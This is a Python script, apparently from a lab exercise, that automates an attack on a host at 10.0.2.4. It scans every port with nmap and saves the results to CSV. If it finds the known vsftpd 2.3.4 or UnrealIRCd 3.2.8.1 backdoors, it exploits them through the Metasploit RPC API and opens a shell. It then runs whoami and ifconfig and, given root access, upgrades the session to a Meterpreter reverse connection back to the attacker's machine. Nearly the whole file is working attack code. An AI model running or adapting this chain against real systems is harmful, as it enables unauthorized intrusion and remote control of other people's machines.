import nmap
from pymetasploit3.msfrpc import *
from pymetasploit3.msfconsole import *
import csv
import time
import sys

#### Below is  from https://pypi.org/project/python-nmap/ ####
kali = nmap.PortScanner()

#scan on target machine
#insert desired IP and ports and disired wait time for the timeout
#to scan all subnets use kali.scan('10.0.2.4/24', '0-65535')
kali.scan('10.0.2.4', '0-65535')

#lists storing the information from the scan
TCPports = []
TCPserviceProduct = []
TCPserviceVersion = []
MachinesFound = []
#parsing of the scan information
for host in kali.all_hosts():
        print('----------------------------------------------------')
        print('Host : %s (%s)' % (host, kali[host].hostname()))
        MachinesFound.append(host)
        print('State : %s' % kali[host].state())
        for proto in kali[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
            lport = kali[host][proto].keys()
            for port in lport:
                TCPports.append(port)
                TCPserviceVersion.append(kali[host][proto][port]['version'])
                TCPserviceProduct.append(kali[host][proto][port]['product'])
                print ('port : %s\tstate : %s' % (port, kali[host][proto][port]['state']))

#debugging information
print(TCPports)
print(TCPserviceProduct)
print(TCPserviceVersion)

#saving the above scan
CSVscan = kali.csv()
with open('nmap.csv', 'w', newline='') as file:
    writer = csv.writer(file, delimiter = ";")
    writer.writerows([kali.csv()]) #The save location for this will be whereever this .py file is located



######## Metasploit Section #########

### things to do to run the RPC on msfconsole ###
#msf6 > load msgrpc Pass=mypassword
client =  MsfRpcClient("mypassword", port=55552)
exploit = None

#### There really could be a better way of doing this, as i need to have read the scan logs to know what is running on the ports.
#### However, i believe it safe to assume that multiple if not all machines will have the same software on it if in a coorporate environment
if ("vsftpd" in TCPserviceProduct and "2.3.4" in TCPserviceVersion): #### THIS IS FROM https://github.com/DanMcInerney/pymetasploit3
    print("now hacking vsftpd on port 21")
    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = '10.0.2.4' # IP of our target host
    print(exploit.targetpayloads())
    exploit.execute(payload='cmd/unix/interact') #Interacts with a shel#it is worth noting that you can upgrade the session via shellsession(msfsession) within pymetasploit, but the below was chosen because it is very simple and follows the same structure as before
elif("UnrealIRCD" in TCPserviceProduct and "3.2.8.1" in TCPserviceVersion):
    print("now hacking UnrealIRCD on port 6667")
    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor') # https://cvedetails.com/cve/CVE-2010-2075/
    exploit['RHOSTS'] = '10.0.2.4' # IP of our target host
    exploit.targetpayloads()
    exploit.execute(payload='cmd/unix/reverse') #Double Reverse TCP (telnet)
else:
    print("Alert! Alert!\nWe have found no services to hack :( ")
time.sleep(5)
shell = client.sessions.session('1')
shell.write('whoami') #write commands you want into the target console
ifRoot = shell.read() #checks if the session shell has root access
shell.write('ifconfig') #returns the network information of the shell

#### UPGRADING THE SHELL TO METERPRETER #### https://linux-blog.anracom.com/2020/11/29/penetration-testing-kali-metasploit-upgrade-of-a-session-to-meterpreter/
# This module attempts to upgrade a command shell to meterpreter. The 
#   shell platform is automatically detected and the best version of 
#   meterpreter for the target is selected. Currently 
#   meterpreter/reverse_tcp is used on Windows and Linux, with 
#   'python/meterpreter/reverse_tcp' used on all others.

#the interacting with meterpreter was done using the msfconsole https://github.com/vmvarga/msfpython-scripts/blob/master/task1.py
console = MsfRpcConsole(client)
  
if ("root" in ifRoot): #will only execute if shell has root access (or if the shell even exists)
    print("Upgrading the Shell to Meterpreter on 10.0.2.4")
    console.execute("use post/multi/manage/shell_to_meterpreter")
    console.execute("set SESSION 1")
    console.execute("set LHOST 10.0.2.15") #Put attacking/host machine IP here
    console.execute("set LPORT 8090") #Port of attacking machine that you want to use
    console.execute("run")
    time.sleep(10) #THIS IS NEEDED SO THAT THE COMMANDS FULLY EXECUTE
    print("To interact with meterpreter please use the metasploit terminal that you should still have open")
    print("use the command <sessions -i 2> in metasploit to interact with meterpreter\n")
print("--------------------------------------")
print("------------HACKING DONE--------------")
print("--------------------------------------\n\n\n")
try:
    console.console.destroy()
except:
    sys.exit()